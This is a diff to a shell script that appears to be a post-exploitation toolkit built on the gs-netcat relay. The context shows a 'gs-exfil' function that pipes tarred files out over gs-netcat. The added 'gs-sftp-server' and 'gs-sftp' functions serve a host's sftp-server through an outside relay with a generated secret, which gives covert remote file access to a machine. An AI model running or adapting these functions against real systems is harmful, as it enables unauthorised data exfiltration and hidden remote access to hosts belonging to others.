@@ -1368,6 +1368,40 @@ gs-exfil() {
     tar -czvf - "$@" | gs-netcat -s "$SECRET"
 }
 
+gs-sftp-server() {
+    _hs_dep gs-netcat
+    [ -z "$GSNC" ] && GSNC=$(command -v gs-netcat 2>/dev/null) && [ -z "$GSNC"] && {
+        echo >&2 "gs-netcat not found."
+        return 255
+    }
+    local s=$(${GSNC} -g)
+    local sftp_fn="/usr/lib/sftp-server"
+    [ ! -x "$sftp_fn" ] && sftp_fn="/usr/lib/openssh/sftp-server"
+    [ ! -x "$sftp_fn" ] && sftp_fn="/usr/libexec/sftp-server"
+    [ ! -x "$sftp_fn" ] && {
+        echo >&2 "sftp-server not found at '$sftp_fn'."
+        return 255
+    }
+
+    echo -e "Connect with: ${CDC}SECRET='$s' ${GS_HOST:+GS_HOST=$GS_HOST }${GS_PORT:+GS_PORT=$GS_PORT }gs-sftp${CN}"
+    echo -e "${CF}or with     : ${CDC}${CF}GS_ARGS='-s${s}' ${GS_HOST:+GS_HOST=$GS_HOST }${GS_PORT:+GS_PORT=$GS_PORT }sftp -D gs-netcat${CN}"
+    GSOCKET_NO_GREETINGS="1" GS_ARGS="-s${s}" ${GSNC} -l -e "$sftp_fn"
+}
+
+gs-sftp() {
+    _hs_dep sftp
+    [ -z "$GSNC" ] && GSNC=$(command -v gs-netcat 2>/dev/null) && [ -z "$GSNC"] && {
+        echo >&2 "gs-netcat not found."
+        return 255
+    }
+    [ -z "$SECRET" ] && {
+        echo >&2 "Usage: Execute 'gs-sftp-server' on any server first."
+        return 255
+    }
+
+    GSOCKET_NO_GREETINGS="1" GS_ARGS="-s${SECRET}" sftp -D "$GSNC"
+}
+
 # <pid> <string-pattern>
 # - on Read-only sections (.text, .rodata) of the process memory
 # - Fixed string pattern match only
